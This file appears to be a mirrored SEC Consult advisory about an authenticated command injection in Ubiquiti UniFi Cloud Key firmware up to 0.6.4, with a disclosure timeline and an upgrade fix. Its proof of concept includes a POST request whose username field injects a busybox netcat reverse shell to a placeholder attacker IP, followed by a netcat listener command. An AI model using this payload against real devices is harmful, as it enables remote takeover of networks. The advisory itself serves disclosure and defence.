@@ -1,0 +1,123 @@
+id: 28551
+date: 09/15/2017
+title: Ubiquiti Networks UniFi Cloud Key Command Injection Vulnerability
+author: Tim Weber
+cves: 
+
+title: Authenticated Command Injection
+            product: Ubiquiti Networks UniFi Cloud Key
+ vulnerable version: Firmware version <=0.6.4
+      fixed version: Firmware version >=0.6.9
+         CVE number: -
+             impact: High
+           homepage: https://www.ubnt.com
+              found: 2017-03-26
+                 by: T. Weber (Office Vienna)
+                     SEC Consult Vulnerability Lab
+
+                     An integrated part of SEC Consult
+                     Bangkok - Berlin - Linz - Luxembourg - Montreal - Moscow
+                     Kuala Lumpur - Singapore - Vienna (HQ) - Vilnius - Zurich
+
+                     https://www.sec-consult.com
+=======================================================================
+
+Vendor description:
+-------------------
+"Ubiquiti Networks develops high-performance networking
+technology for service providers and enterprises. Our technology
+platforms focus on delivering highly advanced and easily deployable
+solutions that appeal to a global customer base in underserved and
+underpenetrated markets."
+
+Source: http://ir.ubnt.com/
+
+
+Business recommendation:
+------------------------
+The patch supplied by the vendor should be installed immediately.
+
+There are indications for further security issues within this device, hence
+SEC Consult recommends performing a detailed review by security professionals.
+
+
+Vulnerability overview/description:
+-----------------------------------
+1) Authenticated Command Injection in Administrative Interface
+A change of the username with a hand crafted request leads to command injection
+in the administrative interface. This vulnerability can be exploited when the
+cloud key web interface is exposed to the internet.
+
+An attacker which can access the administrative web interface of the cloud
+key after cracking a cloud account password is able to execute arbitrary
+commands without access to the local network. Since the Ubiquiti switches also
+use the same credentials, the whole network can be compromised over this attack
+vector.
+
+
+Proof of concept:
+-----------------
+1) Authenticated Command Injection in Administrative Interface
+The following PHP code excerpt is responsible for the username command execution:
+
+(api.inc, line 455)
+-------------------------------------------------------------------------------
+[...]
+function chusername($username) {
+    exec(CMD_CHUSERNAME . ' ' . $username, $out, $rc);
+    return $rc;
+}
+[...]
+-------------------------------------------------------------------------------
+
+Since '$username' is not filtered, a command injection is possible.
+
+The following POST request opens a reverse-shell to the attacker:
+-------------------------------------------------------------------------------
+POST /api/account HTTP/1.1
+Host: $host
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
+Accept: application/json, text/plain, */*
+Accept-Language: en-US,en;q=0.5
+Content-Type: application/x-www-form-urlencoded
+X-Access-Token: <Token>
+Referer: https://$host/manage/maintenance
+Content-Length: 57
+Cookie: CKSESSIONID=<Session-ID>
+Connection: close
+
+{"username":";busybox nc $attackerIP 8999 -e /bin/bash;"}
+-------------------------------------------------------------------------------
+
+As listener, netcat was used:
+$ nc -lvp <Attacker-Port>
+
+
+Vulnerable / tested versions:
+-----------------------------
+Ubiquiti Networks UniFi Cloud Key version 0.6.1 has been tested.
+This version was the latest at the time the security vulnerabilities
+were discovered. Version 0.6.4 has been checked and found to be
+vulnerable as well.
+
+
+Vendor contact timeline:
+------------------------
+2017-03-29: Contacting vendor via HackerOne. Vendor sets status to
+            "Triaged".
+2017-04-24: Asking for a status update; No answer.
+2017-05-06: Found update 0.6.4 on the website of the vendor, firmware
+            is still vulnerable.
+2017-05-15: Contacted vendor via e-mail and asked for status.
+2017-06-01: Vendor sent a link to the fixed version 0.6.9.
+2017-06-07: Verified the fix in this version. Vendor marked the issue
+            as resolved.
+2017-09-13: Public release of security advisory
+
+
+Solution:
+---------
+Upgrade to v0.6.9 or above.
+https://community.ubnt.com/t5/UniFi-Updates-Blog/UniFi-Cloud-Key-firmware-0-6-9-has-been-released/ba-p/1974091
+
+#  0day.today [2023-03-24]  #
